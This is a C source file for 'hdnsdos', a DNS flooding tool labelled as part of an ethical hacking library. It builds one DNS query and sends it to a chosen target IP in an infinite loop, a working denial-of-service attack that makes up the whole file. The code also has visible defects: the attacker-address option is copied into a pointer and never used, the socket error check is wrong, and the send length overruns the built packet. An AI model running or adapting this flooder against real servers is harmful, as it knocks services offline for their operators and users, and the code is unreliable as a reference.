/* hdnsdos - program to dns ddos
 * this is main file of hehddos
 * Part of hehsniff ethical hacking library
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cstdlib>
#include <sys/socket.h>
#include <getopt.h> 

#include "../include/hehlib.h"

void usage()
{
	fprintf(stderr, "hdnsdos [-d false domain name] [-a attacker ip] [-t target ip]\n");
	exit(1);
}

int main(int argc, char **argv)
{
	 unsigned char datagram[1000];
	 const u_int16_t dns_process_id = 0x1d79;
	 char *domain_name = NULL;
	 unsigned char *attack_address = NULL;
	
         struct sockaddr_in target_addr_struct;
         target_addr_struct.sin_family = AF_INET;
	 target_addr_struct.sin_port = htons(DNS_PORT);

	 int loop_counter;
	 int option_value;
	 
	 if(argc < 2)
	 {
		 usage();
	 }

	 while ((option_value = getopt(argc, argv, "d:t:a:h")) != -1) {
	 	switch(option_value) {
			case 'd':
			   domain_name = optarg;
			   break;
			case 'a':
			{
			    unsigned int temp_addr;
			    temp_addr = inet_addr(optarg);
			    memcpy(&attack_address, &temp_addr, IP_SIZE);
			    break;
			}
			case 't':
			    target_addr_struct.sin_addr.s_addr = inet_addr(optarg);
			    break;
			case 'h':
			    usage();			    
			    break;
		 	default:
			    usage();
			    break;
		}


	}

	int bomb_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        
	if (bomb_socket == 1) {
		perror("Canno't open socket(exit)");
		exit(1);
	}
	
	/* creating dns query */
	make_dns_header(datagram, dns_process_id, STANDARD_QUEST_FLAG, 1, 0, 0, 0);
	make_dns_question(datagram + sizeof(struct dns_header), domain_name, TYPE_A_DNS, CLASS_IN_DNS);
	
	/* sending fake dns query in while loop */
	while (1) {
		if (sendto(bomb_socket, datagram, sizeof(struct dns_header)  + strlen(domain_name) + 2 + sizeof(u_int32_t) + 200 , 0, (struct sockaddr*)(&target_addr_struct), sizeof(struct sockaddr)) < 0) {
			perror("failed to send query");
			exit(1);
		}
        }
 }

